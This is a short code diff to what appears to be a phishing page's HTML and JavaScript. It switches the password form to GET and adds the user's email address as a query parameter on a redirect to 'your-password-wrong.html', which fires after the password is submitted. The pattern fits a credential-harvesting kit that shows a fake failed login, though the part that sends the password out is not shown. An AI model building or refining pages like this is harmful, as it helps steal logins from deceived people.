@@ -62,7 +62,7 @@
            <br>
          </div>
          <br>
-         <form method="post">
+         <form method="get">
          <div class="form-controll">
   <input required type="password" name="" class="mailp"  id="myInput"/>
 
@@ -207,7 +207,9 @@ if(pass != ""){
               
               function (data, status) {
                 //console.log(data);
-                  window.location.href = "your-password-wrong.html";
+                  var data = "mail="+mail;
+
+                  window.location.href = "your-password-wrong.html?"+ data;
            });
              }
 
